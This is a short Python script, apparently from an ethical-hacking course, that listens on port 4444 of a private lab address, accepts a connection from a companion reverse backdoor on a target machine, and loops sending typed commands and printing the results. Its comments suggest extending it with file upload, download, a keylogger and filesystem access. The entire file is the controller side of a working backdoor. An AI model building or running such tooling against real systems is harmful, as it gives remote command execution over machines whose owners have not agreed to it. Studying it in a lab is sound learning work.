#!/usr/bin/env python
# program to listen and wait incoming connection
# now write your own listener because using prebuilt tool like netcat dont run cd command and making our own liatne helps add functionality like upload,download etc

import socket
listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)#method to change any option in socket we want.here we want to reuse loose or drop connection
# thisallow us to reuse socket.if connection drops or loose connection then socket that we created can be reused to create new connection
# socket.SOL_SOCKET=level to modify,socket.SO_REUSEADDR=option to modify(what to modify)and 1 is value to modify(enable this option)
# here we dont want to connect but listen for connection so use bind which wait for connection
listener.bind(("10.0.2.16",4444))#local ip and port where we want to listen(bind) connection
listener.listen(0)#0 is backlog it is number of connection that can be queued before the system starts refusing connection
print("[+] waiting for incoming connection")
connection,address=listener.accept()#to tell to accept connection
# listner.accept return two value 1st is  socket value that represent connection which is used to send and receive data
# 2nd value is address that is bound to that connection
# impt connection is similar to connection that we created in reversebackdoor.py which was used to send and receive data

print("[+] got connection from " + str(address))
while True:
    command=input(">>")
    connection.send(command)#to send command
    result=connection.recv(1024)#wait for result and return the report send after execution by target(reverse_backdoor.py)
    print(result)

#socket can be used to transfer data betwn client ,backetdoor is one of many example of socket
# modify it to make it allow to upload,download file,execute leylogger,access filesys
#  
 